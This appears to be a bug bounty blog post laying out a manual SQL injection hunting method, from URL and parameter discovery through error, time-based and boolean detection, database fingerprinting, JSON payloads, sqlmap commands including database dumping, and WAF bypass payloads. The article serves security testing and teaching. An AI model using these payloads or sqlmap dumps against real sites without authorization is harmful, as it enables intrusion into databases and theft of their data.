---
title: 'How I Find SQL Injection Vulnerabilities: My Bug Bounty Hunting Manual Testing Methodology'
subtitle: By S4YEM.7KuroX
tags:
- Sql Injection
- Bug Bounty
- Web Security
- Penetration Testing
- Cybersecurity
published: '2026-07-23'
free: true
freedium_url: https://freedium-mirror.cfd/https://sayemeh.medium.com/how-i-find-sql-injection-vulnerabilities-my-bug-bounty-hunting-manual-testing-methodology-970c87535839
source_url: https://sayemeh.medium.com/how-i-find-sql-injection-vulnerabilities-my-bug-bounty-hunting-manual-testing-methodology-970c87535839
---

# How I Find SQL Injection Vulnerabilities: My Bug Bounty Hunting Manual Testing Methodology

*By S4YEM.7KuroX*

*Published Jul 23, 2026 · Free: Yes*

_A hands-on walkthrough of the exact reconnaissance, detection, and exploitation techniques I use daily as a bug bounty hunter to find SQL injection vulnerabilities — from blind SQLi to WAF bypasses._

### Introduction

SQL Injection (SQLi) remains one of the most critical vulnerabilities in the OWASP Top 10, and despite being decades old, it still pays well on bug bounty programs. In this article, I'll walk you through my exact methodology — from reconnaissance to confirmation — that helped me find SQLi in modern web applications.

### 1. Reconnaissance: Finding Your Attack Surface

Before firing off payloads, you need to know where to look.

#### Manual Parameter Discovery

- Every input is a suspect: URL parameters (`?id=`, `?page=`, `?cat=`), POST body fields, JSON keys, headers (`User-Agent`, `X-Forwarded-For`), and cookies.
- Common parameter names: `id`, `page`, `category`, `product`, `user`, `name`, `search`, `sort`, `order`, `limit`, `offset`, `filter`, `tab`, `view`, `lang`, `redirect`, `url`.

### Automated Parameter Discovery

```graphql
# Use waybackurls to find historical parameters
waybackurls target.com | grep "?" | uro | httpx -silent

# Use gau (GetAllUrls)
gau --subs target.com | grep "=" | uro

# Use katana for crawling
katana -u https://target.com -d 3 -aff | grep "="
```

_My Tips for Hunters_

```bash
cat urls.txt | grep -oP '[\?\&][a-zA-Z0-9_\-]+=' | sort -u > params.txt
```

### 2. Detection: Finding the Entry Point

**_#How Can we sql inject the page?_**

`Special characters: ', " , ) , ')) , ") ,")) ,') ,')) ***\`

#### Erros:

**[1]Query failed : You have an error in your SQL syntax; check the manual that corresponds
 to your MySQL server version for the right syntax to use near ''' at line 1**

[2] (Warning: mysql_fetch_array(): supplied argument is not a valid MySQL result resource
 in C:\Inetpub\vhosts\[EXMPLE.com](http://jayapriya.com/)\httpdocs\gallery.php on line 11)

### The Classic Tautology Test

Send a single quote (') and observe the response:

```graphql
https://target.com/product?id=1'
```

Look for:

- 500 Internal Server Error
- Database error messages (MySQL, PostgreSQL, MSSQL, Oracle)
- Different response length from the original
- Missing content on the page

### Time-Based Detection (Blind SQLi)

When errors are hidden, go blind:

```graphql
https://target.com/product?id=1 AND SLEEP(5)--
https://target.com/product?id=1' WAITFOR DELAY '0:0:5'--
```

If the page takes exactly 5 seconds longer to respond — _you've got a winner._

### Boolean-Based Detection

```graphql
https://target.com/product?id=1 AND 1=1--   # Should return normal
https://target.com/product?id=1 AND 1=2--   # Should return different/false
```

Compare response content, length, or HTTP status codes.

### 3. Fingerprinting the Database

Once you confirm injection, identify the backend:

**Database Sleep Function Reference**

```graphql
Database             SleepFunction                      Syntax-Example
--------            ---------------                    ----------------
MySQL                  SLEEP(n)                         1 AND SLEEP(5)--
PostgreSQL            PG_SLEEP(n)                      1 AND PG_SLEEP(5)--
MSSQL                WAITFOR DELAY                  1 WAITFOR DELAY '0:0:5'--
Oracle          DBMS_PIPE.RECEIVE_MESSAGE       1 AND DBMS_PIPE.RECEIVE_MESSAGE('x',5)--
```

#### Version Extraction Queries

Once the database type is confirmed, extract the version banner:

```sql
 Database                  Version Query
----------                ---------------
  MySQL                  UNION SELECT @@version,2,3--
PostgreSQL               UNION SELECT version(),2,3--
  MSSQL                  UNION SELECT @@version,2,3--
 Oracle                  UNION SELECT banner,NULL FROM v$version--
```

### 4. Advanced Detection Techniques

### JSON & API SQLi

Modern APIs often use JSON. Don't forget to test:

```json
{"id": "1 OR 1=1--", "name": "test"}
{"id": {"$gt": ""}, "name": "test"}  // NoSQL variation
```

#### **i'm Using SQLMap Efficiently**

```bash
# Step 1: Capture the exact request
sqlmap -r request.txt --batch --level 3 --risk 2

# Step 2: Specify the parameter
sqlmap -u "https://target.com/product?id=1" -p id --batch

# Step 3: For blind, use time-based techniques
sqlmap -u "https://target.com/product?id=1" --technique=T --time-sec=2

# Step 4: Dump data only if confirmed
sqlmap -u "https://target.com/product?id=1" --dbs --batch
```

#### How i will do Bypassing WAFs

When you hit a WAF, try:

- Comment obfuscation: `1'/**/OR/**/1=1--`
- Case variation: `1' oR 1=1--`
- Null bytes: `1%00' OR 1=1--`
- Double URL encoding: `1%2527 OR 1=1--`
- Parameter pollution: `?id=1&id=1' OR 1=1--`
- HPP (HTTP Parameter Pollution): `?id=1&id=2`

### 5. Tools I Use Daily

```bash
   Tool                                     Purpose
---------                                -------------
Burp Suite Pro                  Intercept, Repeater, Intruder
sqlmap                             Automated exploitation
ffuf                                 Parameter fuzzing
waybackurls / gau                Historical URL collection
gf                              Pattern matching for params
httpx                              Probing live endpoints
notify                              Alerting on findings
```

### Final Thoughts

SQL injection is alive and well. The difference between finding it and missing it often comes down to patience and methodology. Crawl deeper, test every parameter, and don't assume a WAF means you're safe.

**If you found this helpful, follow me for more content on Bug Bounty, Web Security, Penetration Testing, and Cybersecurity.**

Keep learning.

Keep practicing.

Stay ethical.

And never stop asking **"What if?"**

Happy Hunting! 🛡️

— **S4YEM.7KuroX**